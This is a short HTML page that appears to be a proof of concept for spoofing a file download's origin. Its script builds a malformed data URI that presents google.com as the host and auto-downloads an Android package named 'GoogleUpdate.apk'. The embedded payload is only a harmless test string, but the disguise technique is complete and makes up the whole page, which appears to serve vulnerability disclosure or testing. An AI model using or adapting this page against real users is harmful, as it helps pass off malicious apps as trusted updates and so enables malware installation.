<!DOCTYPE html>
<html>
<body style="text-align:center;margin-top:60px">

<button onclick="go()" style="font-size:18px;padding:14px 28px">
  Download
</button>

<script>
function go() {
  const a = document.createElement("a");
  a.href =
    "data://google.com/application/vnd.android.package-archive;base64," +
    "VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==" +
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  a.download = "GoogleUpdate.apk";
  document.body.appendChild(a);
  a.click();
  a.remove();
}
</script>

</body>
</html>
